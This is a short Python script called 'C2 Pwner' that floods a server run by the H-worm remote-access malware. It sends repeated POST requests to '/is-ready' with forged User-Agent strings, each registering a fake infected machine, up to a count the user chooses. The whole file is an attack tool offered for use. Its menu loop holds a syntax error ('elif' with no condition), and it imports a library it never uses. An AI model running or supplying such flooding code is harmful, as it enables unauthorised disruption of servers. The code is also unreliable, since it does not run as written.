"""
C2 Pwner by SadFud.
Contribute to this project here https://github.com/SadFud/C2-Pwner
"""
import requests
from Crypto import *
def hworm_flood():
    url = raw_input('Insert DNS: ')
    port = raw_input('Insert port: ')
    delimiter = raw_input('Insert delimiter [0 for default]: ')
    if delimiter == "0":
        delimiter = "<|>"
    identification = raw_input('Insert ID: ' )
    pc = raw_input('Insert computer name: ')
    user = raw_input('Insert username: ')
    os = raw_input('Insert OS: ')
    version = raw_input('Insert worm version: ')
    av = raw_input('Insert antivirus name: ')
    usb = raw_input('Inset usb value [TRUE or FALSE]: ')
    zombies = int(raw_input('Insert number of zombies to send: '))
    failed = 0
    for x in range (0, zombies):
        conc = identification + str(x) + delimiter +  pc + delimiter + user +  delimiter + os + delimiter + version +  delimiter + av + delimiter + usb
        cabecera = {'User-Agent' : conc}
        r = requests.post('http://' + url + ':' + port + '/is-ready', headers=cabecera)
        if r.status_code == requests.codes.ok:
            print('Zombie number ' + str(x) + ' sent.')
            x = x + 1
        else:
            failed = failed + 1
            print('Conexion error.')
            if failed >= zombies / 10:
                print('Too many conexion errors, the task will be stopped.')
                break

while 1:
    print ('1. Hworm flooder.')
    print ('0. Exit.')
    option = int(raw_input('Select option: '))
    if option == 1:
        hworm_flood()
    elif:
        break
